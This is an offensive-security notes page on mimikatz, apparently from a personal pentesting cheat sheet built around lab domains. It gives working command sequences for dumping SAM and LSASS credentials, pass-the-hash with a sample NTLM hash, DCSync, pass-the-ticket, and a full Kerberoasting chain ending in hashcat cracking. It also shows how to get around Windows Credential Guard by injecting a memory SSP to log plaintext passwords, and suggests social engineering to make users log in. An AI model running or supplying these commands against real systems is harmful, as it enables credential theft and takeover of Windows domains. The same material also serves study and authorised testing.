---
title: mimikatz
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - dump hashes
  - passwords
  - pass the hash attack
---
# mimikatz

**`mimikatz`** is a tool made in `C` .

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

Kiwi module in [a meterpreter in metasploit](metasploit.md) is an adaptation of mimikatz.

## No installation, portable

Download from: https://github.com/ParrotSec/mimikatz.git

## Basic usage

```bash
# Impersonate as NT Authority/SYSTEM (having permissions for it).
token::elevate

# List users and hashes of the machine
lsadump::sam

# Enable debug mode for our user
privilege::debug

# List users logged in the machine and still in memory
sekurlsa::logonPasswords full

# Pass The Hash attack in windows:
# 1. Run mimikatz
mimikatz.exe privilege::debug "sekurlsa::pth /user:<username> /rc4:<NTLM hash> /domain:<DOMAIN> /run:<Command>" exit
# sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password
# /run:<Command>: For example /run:cmd.exe
# 2. After that, we can use cmd.exe to execute commands in the user's context. 

# Example for Pass The Hash attack in windows:
mimikatz.exe sekurlsa::pth /domain:htb.local /user:jackie.may /rc4:ad11e823e1638def97afa7cb08156a94 /run:cmd.exe


# Run a dcsync attack:
.\mimikatz.exe privilege::debug "lsadump::dcsync /domain:$domain /user:Administrator" exit

#####
# Analyze a lsaass dump file:
#####
# Using 'mimikatz.log' for logfile
mimikatz # log
# Switch to MINIDUMP : 'lsass.dmp'
mimikatz # sekurlsa::minidump lsass.dmp
# Opening : 'lsass.dmp' file for minidump...
mimikatz # sekurlsa::logonpasswords
###########

```


## PassTheTicket attack

```
# Export the tickets existing in machine1 so they can be used 
sekurlsa::tickets /export

# That will generate a lot of tickets. To pass the ticket to our context
kerberos::ptt  {ticketname}

# Now the ticket is loaded in our machine 1. We can now do a dir on machine2
dir \\machine2\c$

# Or 
psexec \\machine2 cmd.exe

```

## An Example

**1.** Enumerating SPNs with setspn.exe

```cmd-session
setspn.exe -Q */*
```

We will focus on `user accounts` and ignore the computer accounts returned by the tool.

**2.** Using PowerShell, we can request TGS tickets for the interested account and load them into memory.

```powershell
Add-Type -AssemblyName System.IdentityModel
# Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.
# -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
# System.IdentityModel is a namespace that contains different classes for building security token services

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
#  New-Object cmdlet to create an instance of a .NET Framework object.
# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token 
# -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433": pass the SPN name to the class to request a Kerberos TGS ticket
```


**3.** If needed, we could also retrieve all tickets:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```


**4.** Extract Tickets from Memory with Mimikatz

```cmd-session
# Launch mimikatz
mimikatz.exe

# Specify base64
base64 /out:true
# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.

# Export the tickets
kerberos::list /export 
```

**5.** Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

```shell-session
echo "<base64 blob>" |  tr -d \\n 
```


**6.** We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

**7.** Use [kirbi2john.py](kirbi2john.md):


```shell-session
python2.7 kirbi2john.py Filename.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ServiceName_tgs_hashcat
```

**8.** Cracking the Hash with Hashcat

```shell-session
hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.


## Evading Windows Credential Guard

### What is Windows Credential Guard and how it protects password dumping

Unlike local account hashes which are stored in the SAM, credential information such as domain hashes are stored in the memory of the **lsass.exe** process. Fortunately, _Mimikatz_ can locate these stored credentials for us.  Because of this Microsoft has introduced several mitigations to attempt to combat this.

When Windows Credential Guard is enabled (check with Get-ComputerInfo), the Local Security Authority (LSASS) environment runs as a trustlet in VTL1 named  LSAISO.exe (LSA Isolated) and communicates with the **LSASS.exe** process running in VTL0 through an RCP channel.

>[_Virtualization-based Security (VBS)_](https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs) is a software technology which creates and isolates secure regions of memory which become the _root of trust_ of the operating system. VBS runs a [_hypervisor_](https://www.redhat.com/en/topics/virtualization/what-is-a-hypervisor) on the physical hardware rather than running on the operating system. Specifically, VBS is implemented through [_Hyper-V_](https://en.wikipedia.org/wiki/Hyper-V), Microsoft's native hypervisor. In addition, Microsoft built the [_Virtual Secure Mode_](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm) (VSM) which is a set of hypervisor capabilities offered to the Hyper-V partitions. VSM maintains this isolation through what is known as [_Virtual Trust Levels_](https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_OffensiveCon/2019_02%20-%20OffensiveCon%20-%20Growing%20Hypervisor%200day%20with%20Hyperseed.pdf) (VTLs). Each VTL represents a separate isolated memory region and currently Microsoft supports up to 16 levels, ranked from least privileged, VTL0, to VTL1, with VTL1 having more privileges than VTL0 and so on. As of the writing of this module Windows uses two VTLs:
>
>- _VTL0_ (VSM Normal Mode): Contains the Windows environment that hosts regular user-mode processes as well as a normal kernel (_nt_) and kernel-mode data.
>- _VTL1_ (VSM Secure Mode): Contains an isolated Windows environment used for critical functionalities.
>
>The user-mode in VTL1 is known as [_Isolated User-Mode (IUM)_](https://learn.microsoft.com/en-us/windows/win32/procthread/isolated-user-mode--ium--processes), which consists of IUM processes known as _Trusted Processes_, _Secure Processes_, or _Trustlets_.
>
>Microsoft has used VSM as a base for several mitigations including _Device Guard_, _virtual TPMs_ and _Credential Guard_.

In this Module, we'll focus on [_Credential Guard_](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/how-it-works) mitigation. When enabled, the _Local Security Authority (LSASS)_ environment runs as a trustlet in VTL1 named _LSAISO.exe (LSA Isolated)_ and communicates with the **LSASS.exe** process running in VTL0 through an RCP channel.

Mimikatz can peruse the memory of the LSASS process and retrieve cached hashes, credentials and information. With the new process running in VTL1, all the cached hashes and credential information is stored there, rather than in the memory of the LSASS process, meaning we can't access it.


### The workaround for Windows Credential Guard: abusing Security Support Provider Interfaces (SSPI)

Given that we can't retrieve cached hashes and credentials, we must change our focus. Instead of trying to get this information after a user has already logged into the box, we could attempt to intercept the credentials while a user is logging in.

Microsoft provides quite a few [_authentication mechanisms_](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dn169024\(v=ws.10\)) as part of the Windows operating system such as _Local Security Authority (LSA) Authentication_, _Winlogon_, _Security Support Provider Interfaces (SSPI)_, etc.

Specifically, SSPI is foundational as it is used by all applications and services that require authentication. By default, Windows provides several _Security Support Providers (SSP)_ such as _Kerberos Security Support Provider_, _NTLM Security Support Provider_, etc. these are incorporated into the SSPI as DLLs and when authentication happens the SSPI decides which one to use.

Additionally the SSP can also be registered through the _HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages_ registry key. Each time the system starts up, the _Local Security Authority_ (lsass.exe) loads the SSP DLLs present in the list pointed to by the registry key.

What this means is that if we were to develop our own SSP and register it with _LSASS_, we could maybe force the SSPI to use our malicious Security Support Provider DLL for authentication.

Fortunately, Mimikatz already supports this through the [_memssp_](https://tools.thehacker.recipes/mimikatz/modules/misc/memssp), which not only provides the required Security Support Provider (SSP) functionality but injects it directly into the memory of the **lsass.exe** process without dropping any DLLs on disk.

The Mimikatz SSP takes advantage of the fact that a SSP is called with plaintext credentials through the SSPI allowing us to intercept them directly without needing to resort to a hash.

### Bypassing Windows Credential Guard 

```bash
mimikatz.exe
privilege::debug
misc::memssp
```

When injecting a SSP into _LSASS_ using Mimikatz, the credentials will be saved in a log file, **C:\Windows\System32\mimilsa.log**.

```bash
type C:\Windows\System32\mimilsa.log
```

At this point, we have two options, we can either be patient and wait for another user to remotely connect to the machine or we can resort to additional techniques such as social engineering to coerce someone to log in.